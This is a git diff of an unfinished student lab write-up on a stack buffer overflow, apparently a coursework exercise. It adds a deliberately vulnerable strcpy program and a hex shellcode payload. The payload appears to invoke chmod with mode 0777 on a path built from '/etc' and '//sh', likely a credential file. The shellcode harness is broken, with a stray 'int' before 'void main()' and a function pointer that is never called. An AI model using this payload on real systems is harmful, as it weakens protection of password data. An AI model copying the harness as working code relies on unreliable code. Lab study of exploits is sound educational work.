@@ -39,7 +39,67 @@ void main() {
   You are free to choose Code Injection or Environment Variable approach to do. 
 - Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
 **Answer 1**: Must conform to below structure:
+***Preparation***
+***Step 1: Run the command below to setup the environment***
 
+
+![image](https://github.com/user-attachments/assets/9d60f525-a514-454a-bdd1-52dc5775aafa)
+
+
+***Step 2***
+
+
+I will create a vulnerable.c file and insert this code into it
+
+
+```
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char* argv[])
+{
+	char buffer[16];
+	strcpy(buffer,argv[1]);
+	return 0;
+}
+```
+
+
+And create shellcode.c and insert this code:
+```
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
+"\x3a\x56\x81\xc6\x23\x45\x35\x21"
+"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
+"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
+"\x2f\x65\x74\x63\x83\xec\x0c\x89"
+"\xe3\x66\x68\xff\x01\x66\x59\xb0"
+"\x0f\xcd\x80";
+
+int
+void main() {
+    int (*ret)() = (int(*)())code;
+}
+```
+
+
+***Step 3: Inspect stack frame of vulnerable.c***
+
+
+![image](https://github.com/user-attachments/assets/7456edf8-8706-43d8-ab49-0f8fc6372dfc)
+
+
+***Idea***
+
+
+***Step2: Compile code***
+
+
+
+  
 1. Idea
 `StackFrame` của chương trình 
 
